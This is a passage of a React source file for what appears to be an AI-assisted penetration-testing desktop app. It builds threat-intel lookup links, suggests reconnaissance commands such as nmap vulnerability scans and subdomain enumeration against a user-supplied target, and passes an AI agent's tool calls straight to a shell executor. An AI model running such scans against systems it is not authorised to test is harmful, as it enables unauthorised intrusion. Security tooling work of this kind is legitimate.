        intelReport += `• VirusTotal: https://www.virustotal.com/gui/search/${target}\n`;
        intelReport += `• AbuseIPDB: https://www.abuseipdb.com/check/${target}\n`;
        intelReport += `• Censys: https://search.censys.io/search?q=${target}\n`;
        intelReport += `• WHOIS: https://who.is/whois/${target}\n`;
      }

      setThreatIntel(intelReport);

      toast({
        title: "Intelligence Retrieved",
        description: `Found ${results.data.results?.length || 0} sources`,
      });

    } catch (error) {
      console.error('Threat intel error:', error);

      // Provide helpful fallback information
      const isIP = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(target);
      let fallbackReport = `🔍 THREAT INTELLIGENCE REPORT\nTarget: ${target}\n\n`;
      fallbackReport += `⚠️ Search Error: ${error instanceof Error ? error.message : 'Unknown error'}\n\n`;
      fallbackReport += `🛠️ RECOMMENDED MANUAL LOOKUP TOOLS:\n\n`;
      fallbackReport += `1. Shodan.io - Internet-connected device search\n`;
      fallbackReport += `   https://www.shodan.io/search?query=${target}\n\n`;
      fallbackReport += `2. VirusTotal - Multi-engine security scanner\n`;
      fallbackReport += `   https://www.virustotal.com/gui/search/${target}\n\n`;
      fallbackReport += `3. AbuseIPDB - IP abuse reports\n`;
      fallbackReport += `   https://www.abuseipdb.com/check/${target}\n\n`;
      fallbackReport += `4. Censys - Internet-wide scanning\n`;
      fallbackReport += `   https://search.censys.io/search?q=${target}\n\n`;
      fallbackReport += `5. WHOIS Lookup\n`;
      fallbackReport += `   https://who.is/whois/${target}\n\n`;

      if (isIP) {
        fallbackReport += `💡 LOCAL RECONNAISSANCE COMMANDS:\n`;
        fallbackReport += `• nmap -sV -sC ${target}\n`;
        fallbackReport += `• nmap --script vuln ${target}\n`;
        fallbackReport += `• ping ${target}\n`;
        fallbackReport += `• traceroute ${target}\n`;
      } else {
        fallbackReport += `💡 LOCAL RECONNAISSANCE COMMANDS:\n`;
        fallbackReport += `• nslookup ${target}\n`;
        fallbackReport += `• dig ${target} ANY\n`;
        fallbackReport += `• whois ${target}\n`;
        fallbackReport += `• sublist3r -d ${target}\n`;
      }

      setThreatIntel(fallbackReport);

      toast({
        title: "Search Limited",
        description: "Showing manual lookup resources instead",
      });
    } finally {
      setIsLoadingIntel(false);
    }
  };

  const sendChatMessage = async () => {
    if (!chatInput.trim() || isStreaming) return;

    const userMessage: AIMessage = { role: 'user', content: chatInput };
    setChatMessages(prev => [...prev, userMessage]);
    const userQuery = chatInput;
    setChatInput("");
    setIsStreaming(true);

    let assistantContent = "";

    try {
      // Check if web search is needed
      const needsSearch = /latest|recent|new|current|find|search|research|tools for|best|CVE-|vulnerability/i.test(userQuery);
      let searchContext = "";

      if (needsSearch) {
        try {
          // Perform Tavily search
          const searchResults = await tavilyService.search({
            query: userQuery,
            search_depth: 'advanced',
            max_results: 5,
            include_answer: true,
          });

          if (searchResults.data.answer) {
            searchContext = `\n\n## Web Search Results\n\n**Summary**: ${searchResults.data.answer}\n\n`;
          }
          if (searchResults.data.results && searchResults.data.results.length > 0) {
            searchContext += `**Sources**:\n`;
            searchResults.data.results.slice(0, 3).forEach((result, idx) => {
              searchContext += `${idx + 1}. [${result.title}](${result.url})\n   ${result.content.substring(0, 150)}...\n\n`;
            });
          }
        } catch (searchError) {
          console.error('Search error:', searchError);
        }
      }

      // Add empty assistant message that will be updated during streaming
      setChatMessages(prev => [...prev, { role: 'assistant', content: '', isStreaming: true }]);

      // Build messages array with system prompt
      const systemMessage: AIMessage = {
        role: 'system',
        content: getSystemPrompt()
      };

      // Add search context if available
      let userMessageContent = userQuery;
      if (searchContext) {
        userMessageContent += searchContext;
      }

      const conversationMessages = [systemMessage, ...chatMessages, { role: 'user', content: userMessageContent }];

      // Stream response from OpenClaw (NVIDIA Free)
      const executeCommand = async (cmd: string): Promise<string> => {
        if (window.electronAPI?.executeCommand) {
          return await window.electronAPI.executeCommand(cmd);
        }
        return 'Error: Not running in Electron';
      };

      const stream = openClaw.agenticChat(
        conversationMessages.map(m => ({ role: m.role as 'user' | 'assistant' | 'system', content: m.content })),
        executeCommand,
        'z-ai/glm5',
        0.7,
      );

      for await (const event of stream) {
        if (event.type === 'text') {
          assistantContent += event.content;
        } else if (event.type === 'tool_call') {
          assistantContent += `\n\`\`\`bash\n$ ${event.content}\n\`\`\`\n`;
        } else if (event.type === 'tool_result') {
          const truncated = event.content.length > 2000 ? event.content.slice(0, 2000) + '\n[...]' : event.content;
          assistantContent += `\`\`\`\n${truncated}\n\`\`\`\n`;
        }

        setChatMessages(prev => {
          const newMessages = [...prev];
          newMessages[newMessages.length - 1] = {
            role: 'assistant',
            content: assistantContent,
            isStreaming: true,
          };
          return newMessages;
        });
      }

      // Mark streaming as complete
      setChatMessages(prev => {
        const newMessages = [...prev];
        newMessages[newMessages.length - 1] = {
          role: 'assistant',
          content: assistantContent,
          isStreaming: false,
        };
        return newMessages;
      });

    } catch (error) {
      console.error('Chat error:', error);
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to send message",
        variant: "destructive",
      });

      // Remove the empty assistant message if streaming failed
      setChatMessages(prev => prev.filter(m => m.content !== ''));
    } finally {
      setIsStreaming(false);
    }
  };

  return (
    <div className="h-full flex flex-col p-6 gap-6">
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.4 }}
      >
        <h1 className="text-3xl font-bold text-gradient-silver flex items-center gap-3">
          <Terminal className="h-8 w-8 text-primary" />
          Cyber Operations Command Center
        </h1>
        <p className="text-sm text-muted-foreground mt-2">
          AI-Powered Security Operations Platform
        </p>
      </motion.div>

      <Tabs value={activeTab} onValueChange={(v) => setActiveTab(v as "scan" | "recon" | "attack" | "defence")} className="flex-1 flex flex-col">
        <TabsList className="grid w-full grid-cols-4 bg-card/50 backdrop-blur">
          <TabsTrigger value="scan" className="data-[state=active]:bg-green-500/20">
            <Radar className="mr-2 h-4 w-4" />
            SCANNING
          </TabsTrigger>
          <TabsTrigger value="recon" className="data-[state=active]:bg-purple-500/20">
            <Search className="mr-2 h-4 w-4" />
            RECON
          </TabsTrigger>
          <TabsTrigger value="attack" className="data-[state=active]:bg-red-500/20">
            <Sword className="mr-2 h-4 w-4" />
            ATTACK
          </TabsTrigger>
          <TabsTrigger value="defence" className="data-[state=active]:bg-blue-500/20">
            <Shield className="mr-2 h-4 w-4" />
            DEFENCE
          </TabsTrigger>
        </TabsList>

        <div className="flex-1 grid grid-cols-1 lg:grid-cols-3 gap-6 mt-6">
          {/* Tools Panel */}
          <div className="lg:col-span-1">
            <Card className="h-full border-primary/20 bg-card/50 backdrop-blur">
              <CardHeader>
                <CardTitle>Available Tools</CardTitle>
                <CardDescription>{getTools().length} tools ready</CardDescription>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-[600px] pr-4">
                  <div className="space-y-2">
                    {getTools().map((tool, idx) => {
                      const Icon = tool.icon;
                      return (
                        <Button
                          key={idx}
                          variant={selectedTool?.name === tool.name ? "default" : "outline"}
                          className="w-full justify-start text-left h-auto py-3"
                          onClick={() => selectTool(tool)}
                        >
                          <div className="flex items-start gap-3 w-full">
                            <Icon className="h-5 w-5 mt-0.5 flex-shrink-0" />
                            <div className="flex-1 min-w-0">
                              <div className="font-semibold">{tool.name}</div>
                              <div className="text-xs text-muted-foreground truncate">
                                {tool.description}
                              </div>
                              <Badge variant="secondary" className="mt-1 text-xs">
                                {tool.category}
                              </Badge>
                            </div>
                          </div>
                        </Button>
                      );
                    })}
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </div>

          {/* Command & Output Panel */}
          <div className="lg:col-span-2 space-y-6">
            {/* Command Builder */}
            <Card className="border-primary/20 bg-card/50 backdrop-blur">
              <CardHeader>
                <CardTitle>Command Builder</CardTitle>
                <CardDescription>
                  {selectedTool ? selectedTool.description : "Select a tool to get started"}
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {selectedTool?.requiresTarget && (
                  <div>
                    <label className="text-sm font-medium">Target</label>
                    <div className="flex gap-2">
                      <Input
                        placeholder="IP address or domain"
                        value={target}
                        onChange={(e) => {
                          setTarget(e.target.value);
                          if (selectedTool) {
                            setCustomCommand(selectedTool.template.replace("{target}", e.target.value || "[target]"));
                          }
                        }}
                        className="font-mono flex-1"
                      />
                      <Button
                        variant="outline"
                        onClick={fetchThreatIntel}
                        disabled={!target.trim() || isLoadingIntel}
                        className="gap-2"
                        title="Search threat intelligence about this target"
                      >
                        {isLoadingIntel ? (
                          <Loader2 className="h-4 w-4 animate-spin" />
                        ) : (
                          <Eye className="h-4 w-4" />
                        )}
                        Intel
                      </Button>
                    </div>
                  </div>
                )}
                <div>
                  <label className="text-sm font-medium">Command</label>
                  <Textarea
                    value={customCommand}
                    onChange={(e) => setCustomCommand(e.target.value)}
                    placeholder="Enter custom command or select a tool..."
                    className="font-mono min-h-[100px]"
                  />
                </div>
                <div className="flex gap-2">
                  <Button
                    onClick={runCommand}
                    disabled={!customCommand.trim() || isRunning}
                    className="flex-1"
                  >
                    {isRunning ? "Running..." : "Execute Command"}
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => setShowHistory(!showHistory)}
                    className="gap-2"
                  >
                    <Clock className="h-4 w-4" />
                    History ({commandHistory.length})
                  </Button>
                </div>
              </CardContent>
            </Card>

            {/* Command History */}
            {showHistory && commandHistory.length > 0 && (
              <Card className="border-primary/20 bg-card/50 backdrop-blur">
                <CardHeader>
                  <CardTitle className="flex items-center justify-between">
                    <span className="flex items-center gap-2">
                      <Clock className="h-5 w-5" />
                      Command History
                    </span>
                    <Badge variant="secondary">{commandHistory.length} commands</Badge>
                  </CardTitle>
                  <CardDescription>
                    Recent command executions
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-[400px] pr-4">
                    <div className="space-y-2">
                      {commandHistory.map((item) => (
                        <motion.div
                          key={item.id}
                          initial={{ opacity: 0, x: -20 }}
                          animate={{ opacity: 1, x: 0 }}
                          className="border rounded-lg p-3 bg-muted/30 hover:bg-muted/50 transition-colors"
                        >
                          <div className="flex items-start justify-between gap-2 mb-2">
                            <div className="flex-1 min-w-0">
                              <code className="text-sm bg-black/30 px-2 py-1 rounded block overflow-x-auto">
                                {item.command}
                              </code>
                            </div>
                            <div className="flex gap-1 flex-shrink-0">
                              <Button
                                size="icon"
                                variant="ghost"
                                className="h-7 w-7"
                                onClick={() => toggleHistoryFavorite(item.id)}
                              >
                                <Star
                                  className={`h-4 w-4 ${item.isFavorite ? 'fill-yellow-500 text-yellow-500' : ''}`}
                                />
                              </Button>
                              <Button
                                size="icon"
                                variant="ghost"
                                className="h-7 w-7"
                                onClick={() => copyCommand(item.command)}
                              >
                                <Copy className="h-4 w-4" />
                              </Button>
                              <Button
                                size="icon"
                                variant="ghost"
                                className="h-7 w-7"
                                onClick={() => loadHistoryCommand(item)}
                              >
                                <Terminal className="h-4 w-4" />
                              </Button>
                              <Button
                                size="icon"
                                variant="ghost"
                                className="h-7 w-7 text-destructive"
                                onClick={() => deleteHistoryItem(item.id)}
                              >
                                <Trash2 className="h-4 w-4" />
                              </Button>
                            </div>
                          </div>
                          <div className="flex items-center gap-4 text-xs text-muted-foreground">
                            <span className="flex items-center gap-1">
                              <Clock className="h-3 w-3" />
                              {item.timestamp.toLocaleString()}
                            </span>
                            <span className={item.success ? 'text-green-500' : 'text-red-500'}>
                              {item.success ? <CheckCircle className="h-3 w-3 inline mr-1" /> : <AlertTriangle className="h-3 w-3 inline mr-1" />}
                              {item.success ? 'Success' : 'Failed'}
                            </span>
                            <span>{item.executionTime}ms</span>
                          </div>
                        </motion.div>
                      ))}
                    </div>
                  </ScrollArea>
                </CardContent>
              </Card>
            )}

            {/* Threat Intelligence Report */}
            {threatIntel && (
              <Card className="border-primary/20 bg-card/50 backdrop-blur">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Eye className="h-5 w-5 text-purple-500" />
                    Threat Intelligence Report
                  </CardTitle>
                  <CardDescription>
                    Real-time threat intelligence from Tavily
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-[400px]">
                    <pre className="bg-black/50 p-4 rounded-lg text-sm font-mono whitespace-pre-wrap terminal-text">
                      {threatIntel}
                    </pre>
                  </ScrollArea>
                </CardContent>
              </Card>
            )}

            {/* Output */}
            {output && (
              <Card className="border-primary/20 bg-card/50 backdrop-blur">
                <CardHeader>
                  <CardTitle>Output</CardTitle>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-[300px]">
                    <pre className="bg-black/50 p-4 rounded-lg text-sm font-mono whitespace-pre-wrap terminal-text">
                      {output}
                    </pre>
                  </ScrollArea>
                </CardContent>
              </Card>
            )}

            {/* AI Agent Chat */}
            <Card className="border-primary/20 bg-card/50 backdrop-blur">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Activity className="h-5 w-5 text-primary animate-pulse" />
                  {getAgentName()}
                </CardTitle>
                <CardDescription>{getAgentPrompt()}</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="h-[200px] border rounded-lg overflow-hidden">
                  <ScrollArea className="h-full p-4" ref={chatScrollRef}>
                    {chatMessages.length === 0 ? (
                      <div className="text-center text-muted-foreground text-sm">
                        Ask me anything about {activeTab} operations...
                      </div>
                    ) : (
                      <div className="space-y-3">
                        {chatMessages.filter(m => m.role !== 'system').map((msg, idx) => (
                          <div
                            key={idx}
                            className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}
                          >
                            <div
                              className={`max-w-[80%] p-3 rounded-lg ${
                                msg.role === 'user'
                                  ? 'bg-primary/20 ml-auto'
                                  : 'bg-muted'
                              }`}
                            >
                              <div className="text-sm whitespace-pre-wrap">
                                {msg.content}
                                {msg.isStreaming && (
                                  <span className="inline-block ml-1 w-2 h-4 bg-primary animate-pulse" />
                                )}
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </ScrollArea>
                </div>
                <div className="flex gap-2">
                  <Input
                    value={chatInput}
                    onChange={(e) => setChatInput(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && !e.shiftKey && sendChatMessage()}
                    placeholder="Ask your AI agent..."
                    className="flex-1"
                    disabled={isStreaming}
                  />
                  <Button
                    onClick={sendChatMessage}
                    size="icon"
                    disabled={!chatInput.trim() || isStreaming}
                  >
                    {isStreaming ? (
                      <Loader2 className="h-4 w-4 animate-spin" />
                    ) : (
                      <Send className="h-4 w-4" />
                    )}
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </Tabs>
    </div>
  );
}
